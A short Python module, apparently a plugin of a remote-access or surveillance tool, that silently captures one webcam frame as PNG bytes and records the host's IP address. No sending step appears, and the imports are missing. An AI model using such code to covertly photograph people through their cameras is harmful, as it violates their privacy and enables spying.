#mods/webcam.py
class Webcam:
    def __init__(self):
        self.CURRENT = [None, self._get_client_info()]
        self.SC_DATA = b""
        self.SUCCESS = False
        self.SC_DATA = self.capture()
    def _get_client_info(self):
        class DummyClient:
            def __init__(self):
                self.ip = self.get_ip()
            def get_ip(self):
                try:
                    return socket.gethostbyname(socket.gethostname())
                except:
                    return "0.0.0.0"
        return DummyClient()

    def capture(self):
        try:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            cam.release()
            if not ret:
                return "Webcam capture failed"
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            return buffer.getvalue()
        except Exception as e:
            return f"Webcam error: {e}"



